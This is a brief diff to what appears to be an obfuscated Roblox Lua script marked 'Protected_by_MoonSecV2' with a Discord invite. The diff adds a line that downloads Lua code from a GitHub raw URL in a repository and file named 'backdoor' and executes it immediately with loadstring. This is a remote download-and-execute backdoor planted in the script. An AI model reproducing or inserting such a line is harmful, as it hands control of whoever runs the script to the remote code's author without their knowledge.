@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ramirezmx/backdoor/main/backdoor.lua'))()
+wait(1)
 _Q43Q2XBIXPnoXyFl, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
